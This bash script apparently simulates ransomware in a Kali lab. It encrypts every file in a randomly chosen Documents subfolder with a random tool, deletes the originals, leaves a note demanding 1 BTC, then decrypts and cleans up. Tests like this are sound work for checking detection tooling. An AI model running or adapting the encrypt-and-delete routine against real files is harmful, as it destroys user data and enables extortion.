#!/bin/bash
# Encrypt files in a randomly chosen directory inside /home/kali/Documents and then decrypt them for cleanup

BASE_DIR="/home/kali/Documents"
PASSWORD="testpassword"  # Encryption password
EXTENSIONS=(".enc" ".locked" ".crypt")  # Possible extensions for encrypted files
TOOLS=("openssl" "gpg" "aescrypt")  # Possible encryption tools

# Ensure the base directory exists
if [ ! -d "$BASE_DIR" ]; then
    echo "Base directory $BASE_DIR does not exist. Exiting."
    exit 1
fi

# Get a list of directories within BASE_DIR and choose one at random
DIR_LIST=("$BASE_DIR"/*/)
if [ ${#DIR_LIST[@]} -eq 0 ]; then
    echo "No directories found in $BASE_DIR. Exiting."
    exit 1
fi

RANDOM_DIR="${DIR_LIST[RANDOM % ${#DIR_LIST[@]}]}"
RANDOM_DIR_NAME=$(basename "$RANDOM_DIR")

echo "Encrypting files in $RANDOM_DIR..."

# Randomly select an encryption tool and extension
TOOL=${TOOLS[$RANDOM % ${#TOOLS[@]}]}
EXTENSION=${EXTENSIONS[$RANDOM % ${#EXTENSIONS[@]}]}

# Encrypt each file in the selected directory
for file in "$RANDOM_DIR"*; do
    if [ -f "$file" ]; then
        case $TOOL in
            "openssl")
                openssl enc -aes-256-cbc -salt -in "$file" -out "${file}${EXTENSION}" -k "$PASSWORD"
                ;;
            "gpg")
                gpg --batch --passphrase "$PASSWORD" -c -o "${file}${EXTENSION}" "$file"
                ;;
            "aescrypt")
                aescrypt -e -p "$PASSWORD" -o "${file}${EXTENSION}" "$file"
                ;;
        esac
        rm "$file"  # Remove original file after encryption
    fi
done

# Create a ransom note inside the encrypted directory
RANSOM_NOTE="$RANDOM_DIR/ransom_note.txt"
echo "Files in '$RANDOM_DIR_NAME' have been encrypted. Send 1 BTC to unlock." > "$RANSOM_NOTE"

echo "Encryption complete. Ransom note placed in $RANDOM_DIR."

# Simulating time delay before cleanup (adjust as needed)
sleep 1

echo "Cleaning up and decrypting files in $RANDOM_DIR..."

# Decrypt each file back to its original form
for file in "$RANDOM_DIR"*"$EXTENSION"; do
    if [ -f "$file" ]; then
        original_file="${file%$EXTENSION}"  # Remove extension
        case $TOOL in
            "openssl")
                openssl enc -d -aes-256-cbc -salt -in "$file" -out "$original_file" -k "$PASSWORD"
                ;;
            "gpg")
                gpg --batch --passphrase "$PASSWORD" -d -o "$original_file" "$file"
                ;;
            "aescrypt")
                aescrypt -d -p "$PASSWORD" -o "$original_file" "$file"
                ;;
        esac
        rm "$file"  # Remove encrypted file after decryption
    fi
done

# Remove the ransom note
rm -f "$RANSOM_NOTE"

echo "Cleanup complete. Files in '$RANDOM_DIR_NAME' have been restored."
